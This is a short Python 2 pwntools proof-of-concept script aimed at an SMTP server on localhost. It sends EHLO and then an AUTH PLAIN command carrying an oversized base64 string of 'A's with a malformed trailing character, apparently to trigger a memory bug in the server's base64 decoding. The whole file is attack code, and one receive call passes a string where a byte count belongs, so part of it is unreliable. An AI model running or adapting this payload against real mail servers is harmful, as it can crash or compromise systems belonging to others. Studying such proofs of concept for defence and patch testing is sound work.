#!/usr/bin/python2

import time

from pwn import *


p = None


def ehlo(v):
    p.sendline("EHLO " + v)
    print(p.recvuntil("HELP"))


def auth_plain(v):
    p.sendline("AUTH PLAIN {}".format(v))
    print(p.recv("data"))


def exploit():
    global p

    p = remote("localhost", 25)

    time.sleep(0.6)

    ehlo("test.example.org")
    # auth_plain("QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQ")
    auth_plain("QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQX")

    p.close()


if __name__ == "__main__":
    exploit()
